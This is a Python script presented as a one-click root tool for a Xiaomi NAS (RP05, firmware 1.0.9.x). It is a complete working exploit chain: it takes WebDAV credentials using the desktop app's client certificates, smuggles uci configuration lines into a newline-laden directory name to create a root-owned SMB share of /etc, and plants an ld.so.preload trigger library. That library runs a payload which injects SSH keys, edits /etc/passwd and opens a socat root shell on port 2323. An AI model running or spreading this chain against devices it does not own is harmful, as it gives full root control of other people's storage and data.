#!/usr/bin/env python3
"""
xiaomi-nas-root.py — 小米智能存储 (RP05, 固件 1.0.9.x) 一键获取 root
参照 kid0114/xiaomi-nas-ssh-root-tool 的使用形态，攻击链为本仓库研究的新链路（uci heredoc 注入）。

用法:
    python3 scripts/xiaomi-nas-root.py <NAS_IP>
    python3 scripts/xiaomi-nas-root.py <NAS_IP> --uid <米家数字UID>
    python3 scripts/xiaomi-nas-root.py --preflight

前置条件:
    1. 本机已安装"小米智能存储"桌面端并登录过 NAS（证书目录默认自动查找）
    2. Python 3.9+（仅标准库，无 pip 包依赖；Conda/Homebrew 均非必需）
    3. macOS 自带 ssh-keygen 与 /sbin/mount_smbfs

敏感信息说明:
    - 证书目录默认搜索常见路径; 找不到时用 --cert-dir 指定
    - WebDAV 密码自动经 mTLS 调 get_pool_info 获取, 不落盘
    - SSH 密钥: 若 ~/.ssh/id_ed25519_minas 不存在则现场生成, 私钥只写本机

攻击链 (三步):
    ① mTLS 证书 → get_pool_info 拿 WebDAV 凭据
    ② WebDAV MKCOL 换行目录名 + netshare/add_samba_account uci heredoc 注入
       → force user=root 的 SMB /etc 共享 (root 任意文件写)
    ③ /etc/ld.so.preload + aarch64 触发 .so (固定机器码, 无需现场汇编)
       → cron 每分钟 root 任务执行 → 装 socat root shell(2323) + dropbear(22)
注: 本脚本不做持久化 (重启后 socat shell 与 dropbear 服务消失; SSH 公钥有意保留, 详见 USAGE.md)
"""
import argparse
import base64
import json
import os
import re
import shutil
import socket
import ssl
import subprocess
import sys
import time
import urllib.parse

SHELL_PORT = 2323

CERT_SEARCH = [
    os.path.expandvars(r"%LOCALAPPDATA%\minasCert") if os.name == "nt" else None,
    os.path.expanduser("~/AppData/Local/minasCert"),
    "/Applications/小米智能存储.app/Contents/Resources/extraResources/cert",
]

STEP = [0]


def log(kind, msg):
    colors = {"ok": "\033[32m", "warn": "\033[33m", "fail": "\033[31m", "info": ""}
    reset = "\033[0m"
    if kind == "step":
        STEP[0] += 1
        print("\n\033[1m[%02d] %s\033[0m" % (STEP[0], msg))
        return
    c = colors.get(kind, "")
    print("     %s%s: %s%s" % (c, kind.upper(), msg, reset))


def die(msg):
    log("fail", msg)
    sys.exit(1)


def find_cert_dir(explicit):
    if explicit:
        return explicit if os.path.isdir(explicit) else None
    for d in CERT_SEARCH:
        if d and os.path.isdir(d):
            pems = [f for f in os.listdir(d) if f.endswith("_cert.pem")]
            if pems:
                return d
    # broad search on windows
    for base in [os.path.expandvars(r"%LOCALAPPDATA%"), os.path.expandvars(r"%APPDATA%")]:
        if not base or "%" in base or not os.path.isdir(base):
            continue
        cand = os.path.join(base, "minasCert")
        if os.path.isdir(cand):
            return cand
    return None


class Nas:
    def __init__(self, ip, cert_dir):
        self.ip = ip
        self.cert_dir = cert_dir
        pems = [f for f in os.listdir(cert_dir) if f.endswith("_cert.pem")]
        if not pems:
            die("no *_cert.pem in %s" % cert_dir)
        self.base = pems[0][:-len("_cert.pem")]
        self.ca = os.path.join(cert_dir, "ca_chain.pem")
        self.cert = os.path.join(cert_dir, pems[0])
        self.key = os.path.join(cert_dir, self.base + "_private_key.pem")
        # 服务器 SNI：nas.<uid>.<did>.<角色>。角色段不在客户端证书里且证书 SAN 只精确匹配
        # 特定值（真机实测 .0 有效，.00/.2/.20/.1 均被拒），所以逐候选验证后取可用值。
        der = base64.b64decode(b"".join(
            open(self.cert, "rb").read().splitlines()[1:-1]))
        match = re.search(rb"nas\.[0-9]+\.[0-9a-f]+", der)
        if not match:
            die("cannot parse cert CN prefix")
        prefix = match.group(0).decode()
        self.sn = None
        for role in ("0", "00", "1", "2", "20"):
            candidate = f"{prefix}.{role}"
            raw = None
            try:
                probe = ssl.create_default_context(cafile=self.ca)
                probe.load_cert_chain(str(self.cert), str(self.key))
                raw = socket.create_connection((ip, 443), timeout=8)
                with probe.wrap_socket(raw, server_hostname=candidate) as ps:
                    ps.sendall(b"")  # 握手成功即可
                self.sn = candidate
                break
            except Exception:
                if raw is not None:
                    try:
                        raw.close()
                    except OSError:
                        pass
                continue
        if not self.sn:
            die("no working server CN (tried .0/.00/.1/.2/.20 suffixes)")
        self.uid = self.sn.split(".")[1]
        self.ctx = ssl.create_default_context(cafile=self.ca)
        self.ctx.load_cert_chain(self.cert, self.key)

    def https(self, path, body=None, timeout=15):
        raw = socket.create_connection((self.ip, 443), timeout=timeout)
        s = self.ctx.wrap_socket(raw, server_hostname=self.sn)
        if body is not None:
            if isinstance(body, (dict, list)):
                body = json.dumps(body).encode()
            elif isinstance(body, str):
                body = body.encode()
            req = ("POST %s HTTP/1.1\r\nHost: n\r\nConnection: close\r\n"
                   "Content-Type: application/json\r\nContent-Length: %d\r\n\r\n" % (path, len(body))).encode() + body
        else:
            req = ("GET %s HTTP/1.1\r\nHost: n\r\nConnection: close\r\n\r\n" % path).encode()
        s.sendall(req)
        chunks = []
        s.settimeout(timeout)
        # Connection: close 语义下服务器发完才关连接；超时多为网络慢，
        # 重试至收满（对 timeout 异常重试，对连接关闭/重置停止）
        idle = 0
        while True:
            try:
                d = s.recv(65536)
            except socket.timeout:
                idle += 1
                if idle >= 3:
                    break
                continue
            except OSError:
                break
            if not d:
                break
            idle = 0
            chunks.append(d)
        s.close()
        return b"".join(chunks)  # bytes：chunked 长度是字节数，解码必须在解块之后

    def json_body(self, resp):
        """按字节解码 chunked（长度行是字节数，先 decode 会错位），再解析 JSON。
        解析失败返回 {"raw": ..., "http_status": ...}（A4：调用方区分网络失败与业务失败）。"""
        if isinstance(resp, str):
            resp = resp.encode("utf-8", "surrogateescape")
        i = resp.find(b"\r\n\r\n")
        head, b = resp[:i], resp[i + 4:]
        status = head.split(b"\r\n")[0].decode("utf-8", "replace") if i >= 0 else ""
        if i >= 0 and b"chunked" in head.lower():
            out = b""
            while b:
                m = re.match(rb"([0-9a-fA-F]+)\r\n", b)
                if not m:
                    break
                size = int(m.group(1), 16)
                if size == 0:
                    break
                b = b[m.end():]
                out += b[:size]
                b = b[size + 2:]
            b = out
        text = b.decode("utf-8", "replace")
        try:
            parsed = json.loads(text.strip())
            if isinstance(parsed, dict):
                parsed["http_status"] = status.strip()
            return parsed
        except Exception:
            return {"raw": text[:200], "http_status": status.strip()}

    def webdav(self, method, path, body=None, auth=None, timeout=20):
        raw = socket.create_connection((self.ip, 5000), timeout=timeout)
        s = self.ctx.wrap_socket(raw, server_hostname=self.sn)
        hdrs = {"Host": "n", "Connection": "close"}
        if auth:
            hdrs["Authorization"] = auth
        if body is not None:
            if isinstance(body, str):
                body = body.encode()
            hdrs["Content-Length"] = str(len(body))
        req = "%s %s HTTP/1.1\r\n" % (method, path)
        req += "".join("%s: %s\r\n" % (k, v) for k, v in hdrs.items()) + "\r\n"
        s.sendall(req.encode())
        if body is not None:
            s.sendall(body)
        chunks = []
        s.settimeout(timeout)
        idle = 0
        while True:
            try:
                d = s.recv(65536)
            except socket.timeout:
                idle += 1
                if idle >= 3:
                    break
                continue
            except OSError:
                break
            if not d:
                break
            chunks.append(d)
        s.close()
        return b"".join(chunks).decode("utf-8", "replace")

def build_trigger_so(path_out):
    """Write a minimal aarch64 ET_DYN .so whose DT_INIT forks /bin/sh /etc/.rootpwn.sh.

    The machine code is embedded as fixed bytes: it has no variable inputs, so
    the runner needs no assembler and no third-party Python packages. It was
    assembled once with Keystone (KS_ARCH_ARM64, KS_MODE_LITTLE_ENDIAN) from:

        mov x0, #17; mov x1, xzr; mov x2, xzr; mov x3, xzr; mov x4, xzr
        mov x8, #220; svc #0; cbnz x0, done
        adr x0, str_sh; adr x5, str_script; stp x0, x5, [sp, #-32]!
        str xzr, [sp, #16]; mov x1, sp; mov x2, xzr; mov x8, #221; svc #0
        mov x8, #93; mov x0, #127; svc #0
        done: ret
        str_sh: .ascii "/bin/sh\\0"
        str_script: .ascii "/etc/.rootpwn.sh\\0"

    clone (220) -> child execve (221) /bin/sh /etc/.rootpwn.sh -> exit (93).
    """
    import struct

    code = bytes.fromhex(
        "200280d2e1031faae2031faae3031faae4031faa881b80d2010000d4"
        "800100b580010010a5010010e017bea9ff0b00f9e1030091e2031faa"
        "a81b80d2010000d4a80b80d2e00f80d2010000d4c0035fd6"
        "2f62696e2f7368002f6574632f2e726f6f7470776e2e736800"
    )

    NUM_PH = 2
    code_va = 0x1000
    data = bytearray(b"\x00" * 0x1000)
    data[code_va:code_va + len(code)] = code
    strtab_off = code_va + len(code)
    data += b"\x00"
    symtab_off = strtab_off + 1
    data += b"\x00" * 24
    dyn_off = symtab_off + 24

    dyn = b""
    dyn += struct.pack("<qQ", 12, code_va)      # DT_INIT
    dyn += struct.pack("<qQ", 5, strtab_off)    # DT_STRTAB
    dyn += struct.pack("<qQ", 6, symtab_off)    # DT_SYMTAB
    dyn += struct.pack("<qQ", 10, 1)            # DT_STRSZ
    dyn += struct.pack("<qQ", 11, 24)           # DT_SYMENT
    dyn += struct.pack("<qQ", 0, 0)             # DT_NULL
    data += dyn
    file_size = len(data)

    data[0:4] = b"\x7fELF"
    data[4] = 2
    data[5] = 1
    data[6] = 1
    struct.pack_into("<HHIQQQIHHHHHH", data, 16, 3, 0xB7, 1, 0, 64, 0, 0, 64, 56, NUM_PH, 0, 0, 0)

    def phdr(off, p_type, flags, off_in_file, filesz):
        data[off:off + 56] = struct.pack("<IIQQQQQQ", p_type, flags, off_in_file, off_in_file,
                                         off_in_file, filesz, filesz, 0x1000)

    phdr(64, 1, 5, 0, file_size)
    phdr(120, 2, 4, dyn_off, len(dyn))
    open(path_out, "wb").write(bytes(data))
    return file_size


def ssh_key_path():
    p = os.path.expanduser("~/.ssh/id_ed25519_minas")
    os.makedirs(os.path.dirname(p), exist_ok=True)
    if not os.path.exists(p):
        r = subprocess.run(["ssh-keygen", "-t", "ed25519", "-f", p, "-N", "", "-C", "minas-root"],
                           capture_output=True)
        if r.returncode != 0:
            die("ssh-keygen failed: %s" % r.stderr.decode(errors="replace"))
        log("ok", "generated new key %s" % p)
    return p


def tcp_open(ip, port, timeout=3):
    try:
        s = socket.create_connection((ip, port), timeout=timeout)
        s.close()
        return True
    except Exception:
        return False


def _smb_write_file(share, name, data, password):
    """经 root SMB 共享写文件（WebDAV 拒绝 /etc，实测 451）。Windows 用 net use 挂载；
    POSIX 挂 cifs 失败则报错让用户手动处理。幂等：重复挂载无妨。"""
    path = share + "\\" + name
    if os.name == "nt":
        # 先尝试直接写（Windows 对 UNC 路径可用已存凭据）
        try:
            with open(path, "wb") as f:
                f.write(data)
            return
        except OSError:
            pass
        # 未认证：挂载共享（用户 u<uid>，密码为步骤②创建共享时设置的）
        uid = share.rsplit("-", 1)[-1]
        subprocess.run(["net", "use", share, "/user:u" + uid, password],
                       capture_output=True, timeout=30)
        try:
            with open(path, "wb") as f:
                f.write(data)
        finally:
            subprocess.run(["net", "use", share, "/delete"], capture_output=True, timeout=30)
        return
    # macOS: mount_smbfs(8), no cifs-utils needed; non-root users may mount into a
    # self-owned temp dir. Password is URL-quoted; share name is basename-derived.
    if sys.platform == "darwin":
        import tempfile
        mnt = tempfile.mkdtemp()
        uid = share.rsplit("-", 1)[-1]
        host_share = share.lstrip("\\")
        host, sharename = host_share.split("\\", 1)
        url = "//u%s:%s@%s/%s" % (uid, urllib.parse.quote(password, safe=""), host, sharename)
        res = subprocess.run(["/sbin/mount_smbfs", url, mnt],
                             capture_output=True, timeout=30)
        if res.returncode != 0:
            os.rmdir(mnt)
            raise OSError("mount_smbfs failed: %s (请手动挂载 %s 后重试)" %
                          (res.stderr.decode(errors="replace")[:200], share))
        try:
            with open(os.path.join(mnt, name), "wb") as f:
                f.write(data)
        finally:
            subprocess.run(["umount", mnt], capture_output=True, timeout=30)
            subprocess.run(["diskutil", "unmount", "force", mnt], capture_output=True, timeout=30)
            try:
                os.rmdir(mnt)
            except OSError:
                pass
        return
    # POSIX: 尝试 cifs 挂载（多数发行版需 cifs-utils）
    import tempfile
    mnt = tempfile.mkdtemp()
    uid = share.rsplit("-", 1)[-1]
    res = subprocess.run(["mount", "-t", "cifs", share, mnt,
                          "-o", "username=u{},".format(uid) + "password=" + password],
                         capture_output=True, timeout=30)
    if res.returncode != 0:
        raise OSError("cifs mount failed: %s (请手动挂载 %s 后重试)" %
                      (res.stderr.decode(errors="replace")[:200], share))
    try:
        with open(os.path.join(mnt, name), "wb") as f:
            f.write(data)
    finally:
        subprocess.run(["umount", mnt], capture_output=True, timeout=30)
        os.rmdir(mnt)


def _disarm_command(uid, weird_name):
    """清理命令（成功与失败路径共用）。覆盖：preload/payload 文件、staging 怪名目录、
    注入的 samba 共享与系统用户。注意 authorized_keys 有意保留（SSH 认证通道）。"""
    return ("rm -f /etc/ld.so.preload /etc/pwn.so /etc/.rootpwn.sh /etc/.rootpwn.log; "
            "rm -rf '/home/u%s/pool0/data/%s'; "
            "uci delete sambashare.u%s_2; uci commit sambashare; "
            "uci delete sambauser.u%s_2 2>/dev/null; uci commit sambauser; "
            "sed -i '/sambau%s/d' /etc/passwd /etc/shadow 2>/dev/null; "
            "nas call smb_mgr.sh restart 2>/dev/null || systemctl restart smb nmb 2>/dev/null; "
            "echo CLEAN_OK"
            ) % (uid, weird_name.replace("'", "'\\''"), uid, uid, uid)


def _shell_exec(ip, port, feed, timeout=60):
    """Send shell lines to the socat root shell and collect output.

    Portable across macOS/Windows/Linux: uses a raw socket instead of
    `nc`/`timeout`/`bash`, none of which exist by default on every host.
    The NAS side runs the decoded command with /bin/sh (no bash on device).
    """
    sock = socket.create_connection((ip, port), timeout=10)
    try:
        sock.settimeout(2)
        sock.sendall(feed.encode() + b"\n")
        chunks = []
        deadline = time.time() + timeout
        while time.time() < deadline:
            try:
                data = sock.recv(65535)
            except socket.timeout:
                continue
            if not data:
                break
            chunks.append(data)
            if b"CLEAN_OK" in b"".join(chunks):
                break
        return b"".join(chunks).decode("utf-8", "replace")
    finally:
        sock.close()


def _cleanup_via_shell(args, disarm):
    """经 socat root shell 真正执行清理（成功与失败路径均调用）。
    自身绝不抛异常（FileNotFoundError/TimeoutExpired 等一律捕获降级），失败降级链：
    ① 写完整命令到本地 cleanup-<ip>.sh 并打印路径（用户可经 SMB 上传执行）
    ② 打印完整手动命令（不截断）。"""
    try:
        if tcp_open(args.ip, args.shell_port, timeout=3):
            b64 = base64.b64encode(disarm.encode()).decode()
            feed = "echo %s | base64 -d | sh\nexit\n" % b64
            try:
                out = _shell_exec(args.ip, args.shell_port, feed, timeout=60)
                if "CLEAN_OK" in out:
                    log("ok", "清理完成（preload/共享/staging 已清除）")
                    return
            except OSError as exc:
                log("warn", "清理执行异常（%s），降级到手动方式" % type(exc).__name__)
        _dump_manual_cleanup(args, disarm)
    except Exception as exc:  # 清理自身绝不能成为崩溃点
        log("warn", "清理流程异常（%s），请手动执行" % type(exc).__name__)
        _dump_manual_cleanup(args, disarm)


def _dump_manual_cleanup(args, disarm):
    """完整清理命令落地：写本地 cleanup-<ip>.sh（用户可经 SMB root 共享上传后 bash 执行），
    并全量打印（不截断）。"""
    try:
        script = "#!/bin/sh\n# xiaomi-nas-root-tool cleanup for %s\n%s\n" % (args.ip, disarm)
        local = "cleanup-%s.sh" % args.ip
        with open(local, "w", newline="\n") as f:
            f.write(script)
        log("warn", "自动清理不可用；完整清理命令已写入 %s（可经 SMB root 共享上传到 /etc 后执行）" % local)
    except OSError:
        pass
    print()
    log("warn", "手动清理命令（完整，任一 root 通道执行）：")
    print("    " + disarm)


def preflight(cert_dir_arg=None):
    """Local-only checks. Runs before any NAS contact so a missing workstation
    dependency fails fast instead of stranding an armed preload or share.
    No third-party Python packages are required (standard library only)."""
    problems = []
    if sys.version_info < (3, 9):
        problems.append("Python >= 3.9 required (found %s)" % sys.version.split()[0])
    else:
        log("ok", "python %s" % sys.version.split()[0])
    if sys.platform == "darwin":
        if not os.path.exists("/sbin/mount_smbfs"):
            problems.append("/sbin/mount_smbfs missing (built into macOS; check system installation)")
        if not shutil.which("ssh-keygen"):
            problems.append("ssh-keygen not in PATH (install Xcode Command Line Tools: xcode-select --install)")
        if not shutil.which("umount"):
            problems.append("umount not in PATH")
    elif os.name == "nt":
        pass  # net use is a Windows system command
    else:
        if not shutil.which("mount"):
            problems.append("mount not in PATH (Linux path also needs cifs-utils)")
    try:
        import tempfile
        fd, tmp = tempfile.mkstemp(suffix=".so")
        os.close(fd)
        try:
            build_trigger_so(tmp)
            with open(tmp, "rb") as f:
                magic = f.read(4)
            if magic != b"\x7fELF" or os.path.getsize(tmp) < 0x1000:
                problems.append("trigger .so self-test produced an invalid ELF")
            else:
                log("ok", "trigger .so self-test (%d bytes, embedded code)" % os.path.getsize(tmp))
        finally:
            os.unlink(tmp)
    except Exception as exc:
        problems.append("trigger .so self-test failed: %s" % exc)
    cert_dir = find_cert_dir(cert_dir_arg)
    if cert_dir:
        log("ok", "cert dir %s" % cert_dir)
    else:
        problems.append("cert dir not found; install/log in to the desktop app or pass --cert-dir")
    return problems


def main():
    ap = argparse.ArgumentParser(description="Xiaomi NAS one-click root (RP05, fw 1.0.9.x)")
    ap.add_argument("ip", nargs="?", default=None)
    ap.add_argument("--uid", default=None, help="mi UID digits (default: parsed from cert)")
    ap.add_argument("--cert-dir", default=None, help="client cert dir (auto-searched by default)")
    ap.add_argument("--shell-port", type=int, default=SHELL_PORT)
    ap.add_argument("--preflight", action="store_true",
                    help="check local prerequisites only; do not contact the NAS")
    args = ap.parse_args()

    log("step", "本机前置检查 (preflight)")
    problems = preflight(args.cert_dir)
    if problems:
        for p in problems:
            log("fail", p)
        die("preflight failed. Install Python 3.9+ from python.org, the Xcode "
            "Command Line Tools, or any package manager; Conda and Homebrew are "
            "optional, and no pip packages are required.")
    if args.preflight:
        log("ok", "preflight passed; NAS was not contacted")
        return
    if not args.ip:
        ap.error("ip is required unless --preflight is used")

    cert_dir = find_cert_dir(args.cert_dir)

    nas = Nas(args.ip, cert_dir)
    if args.uid:
        nas.uid = args.uid
    log("ok", "uid=%s sn=%s" % (nas.uid, nas.sn))

    # ---------- ① get WebDAV creds ----------
    log("step", "mTLS 获取 WebDAV 凭据 (get_pool_info)")
    j = nas.json_body(nas.https("/cgi-bin/luci/filemgr/get_pool_info", {"selector": ["webDAV"]}))
    wd = (j.get("data") or {}).get("webDAV") or {}
    if not wd.get("username"):
        die("get_pool_info failed: %s" % j)
    auth = "Basic " + base64.b64encode(("%s:%s" % (wd["username"], wd["password"])).encode()).decode()
    log("ok", "webdav user=%s port=%s (密码不显示)" % (wd["username"], wd.get("port")))

    # ---------- ② uci heredoc injection → root share ----------
    log("step", "uci 注入: 建立 force user=root 的 /etc SMB 共享")
    NL = chr(10)
    Q = chr(34)
    M30 = "M" * 30
    weird_name = (
        M30 + NL + Q + NL +
        "set sambashare.u%s_2.user_force=root" % nas.uid + NL +
        "set sambashare.u%s_2.create_mask=0644" % nas.uid + NL +
        "set sambashare.u%s_2.path=etc" % nas.uid + NL +
        "set sambashare.u%s_2.comment=" % nas.uid
    )
    enc = urllib.parse.quote(weird_name, safe="")
    # /pool0 为单池默认布局（get_pool_info 的 data_dir 即 /pool0/data）；多池设备需按实际调整
    r = nas.webdav("MKCOL", "/pool0/data/" + enc + "/", auth=auth)
    status = r.split("\r\n")[0]
    if not status.startswith("HTTP/1.1 201") and not status.startswith("HTTP/1.1 405"):
        die("MKCOL failed: %s" % status)
    log("ok", "staging dir created (newline-injected name)")

    weird_real = "/home/u%s/pool0/data/%s" % (nas.uid, weird_name)
    # 临时 SMB 口令每次运行随机生成（限内网、窗口仅几分钟，固定口令改为随机的防御纵深）
    import secrets
    smb_password = "Rp!" + secrets.token_urlsafe(12)
    j = nas.json_body(nas.https("/cgi-bin/luci/netshare/add_samba_account",
                                {"username": "u" + nas.uid, "password": smb_password,
                                 "share_dir": [weird_real]}, timeout=60))
    # add 失败不区分原因直接试 set（A4：原实现把解析失败当成功再叠加误判）；
    # id=2 是 smb_get_id 的固定结果（用户首个共享为 1，第二个为 2），非硬编码魔法数
    if j.get("code") not in (0, None):
        j = nas.json_body(nas.https("/cgi-bin/luci/netshare/set_samba_account",
                                    {"id": "2", "username": "u" + nas.uid, "password": smb_password,
                                     "share_dir": [weird_real]}, timeout=90))
    code = j.get("code")
    log("info" if code in (0, None) else "warn", "add_samba_account code=%s (2502 restart-fail 可继续)" % code)
    # note: restart failure is fine — the uci entries are already written; repair below
    time.sleep(5)

    # repair: point share to clean /etc path via set (keeps user_force=root)
    j = nas.json_body(nas.https("/cgi-bin/luci/netshare/set_samba_account",
                                {"id": "2", "username": "u" + nas.uid, "password": smb_password,
                                 "share_dir": ["/etc"]}, timeout=120))
    if j.get("code") not in (0, None) or " 20" not in j.get("http_status", ""):
        die("share repair failed: %s" % j)
    log("ok", "SMB /etc share active as user u%s (force user=root)" % nas.uid)

    # ---------- ③ preload trigger ----------
    log("step", "写入 /etc/ld.so.preload + 触发 .so (cron 每分钟生效)")
    keyp = ssh_key_path()
    pubkey = open(keyp + ".pub").read().strip()

    so_local = os.path.join(os.path.dirname(os.path.abspath(__file__)), "pwn_trigger.so")
    build_trigger_so(so_local)
    log("ok", "trigger .so assembled (%d bytes)" % os.path.getsize(so_local))

    payload = "\n".join([
        "#!/bin/sh",
        "rm -f /etc/ld.so.preload",
        "echo \"PWN $(date) uid=$(id -u)\" >> /etc/.rootpwn.log",
        "mkdir -p /home/rootx/.ssh /etc/dropbear",
        "grep -q minas-root /home/rootx/.ssh/authorized_keys 2>/dev/null || echo '" + pubkey + "' >> /home/rootx/.ssh/authorized_keys",
        "grep -q minas-root /etc/dropbear/authorized_keys 2>/dev/null || echo '" + pubkey + "' >> /etc/dropbear/authorized_keys",
        "chmod 700 /home/rootx/.ssh /etc/dropbear",
        "chmod 600 /home/rootx/.ssh/authorized_keys /etc/dropbear/authorized_keys",
        "sed -i 's#^root:x:0:0:root:/root:#root:x:0:0:root:/home/rootx:#' /etc/passwd 2>/dev/null",
        "systemctl start dropbear.socket 2>/dev/null",
        "pgrep -f TCP-LISTEN:%d >/dev/null || nohup socat TCP-LISTEN:%d,reuseaddr,fork EXEC:\"/bin/sh -i\",pty,stderr,setsid,sigint,sane >/dev/null 2>&1 &" % (args.shell_port, args.shell_port),
        "logger -t rootpwn root-shell-enabled",
    ])

    # /etc 写入走 SMB root 共享（WebDAV 路由层拒绝 /etc，实测 451）。
    # 共享名候选：修复前为 <怪目录名 basename 前 30 字符>-<uid>；但 set_samba_account
    # 把路径改到 /etc 后，部分固件会按新路径 basename 把共享重命名为 etc-<uid>（真机实测），
    # 因此按候选列表逐个尝试。
    share_candidates = ["\\\\%s\\%s-%s" % (args.ip, weird_name[:30], nas.uid),
                        "\\\\%s\\etc-%s" % (args.ip, nas.uid)]
    disarm = _disarm_command(nas.uid, weird_name)
    share = None
    last_exc = None
    for cand in share_candidates:
        try:
            _smb_write_file(cand, ".rootpwn.sh", payload.encode(), smb_password)
            share = cand
            break
        except OSError as exc:
            last_exc = exc
            log("warn", "share %s not writable (%s), trying next" % (cand, exc))
    if share is None:
        _cleanup_via_shell(args, disarm)
        die("SMB write failed on all candidates %s: %s"
            % (share_candidates, last_exc))
    try:
        _smb_write_file(share, "pwn.so", open(so_local, "rb").read(), smb_password)
        log("ok", "payload + .so written to /etc (SMB root share)")
    except OSError as exc:
        # 中途失败：共享已建，必须清理后再 die
        _cleanup_via_shell(args, disarm)
        die("SMB write to %s failed: %s (net use %s /user:u%s %s 手动挂载排查)"
            % (share, exc, share, nas.uid, smb_password))
    try:
        _smb_write_file(share, "ld.so.preload", b"/etc/pwn.so\n", smb_password)
    except OSError as exc:
        _cleanup_via_shell(args, disarm)
        die("arm ld.so.preload failed: %s" % exc)
    log("ok", "ld.so.preload armed — waiting for cron (≤75s)")

    # 触发判据只认 socat 端口：22 端口可能因设备原有 dropbear.socket 已激活而误报
    t0 = time.time()
    got = False
    while time.time() - t0 < 90:
        if tcp_open(args.ip, args.shell_port):
            got = True
            break
        time.sleep(3)

    if not got:
        # 触发失败也必须清理（preload 永久布防会让全机动态进程反复加载）
        _cleanup_via_shell(args, disarm)
        die("trigger did not fire in 90s (socat port %d not open); cleanup attempted. "
            "若 22 端口已开或 /etc/.rootpwn.log 有新记录，说明触发实际成功、仅设备缺少 socat——"
            "此时公钥已注入，可走 SSH 认证通道" % args.shell_port)

    log("step", "验证 root 通道")
    ok22 = tcp_open(args.ip, 22)
    ok23 = tcp_open(args.ip, args.shell_port)
    log("ok" if ok22 else "warn", "SSH 22: %s (dropbear exec bug 可致命令无输出, 认证可用)" % ("OPEN" if ok22 else "closed"))
    log("ok" if ok23 else "warn", "root shell %d: %s" % (args.shell_port, "OPEN" if ok23 else "closed"))

    # 成功后真正执行清理（经已就绪的 root shell）
    _cleanup_via_shell(args, disarm)

    print()
    print("\033[1m✅ root 获取完成\033[0m")
    print("   root shell:  nc %s %d   (或 wsl: wsl bash -c 'nc %s %d')" % (args.ip, args.shell_port, args.ip, args.shell_port))
    print("   SSH:        ssh -i %s root@%s   (公钥已注入; dropbear exec bug 下认证可用)" % (keyp, args.ip))
    print("   会话性质:   未做重启持久化——socat shell 与 dropbear.socket 重启后消失;")
    print("               清理已执行(preload/注入共享/临时目录/samba 账号行)。注意:/etc/dropbear/")
    print("               authorized_keys 与 /home/rootx/.ssh/authorized_keys 中的公钥保留(SSH")
    print("               认证通道重启后仍可用), 如需彻底移除: 删除这两个文件并把 passwd 中")
    print("               root 的 home 改回 /root")


if __name__ == "__main__":
    main()
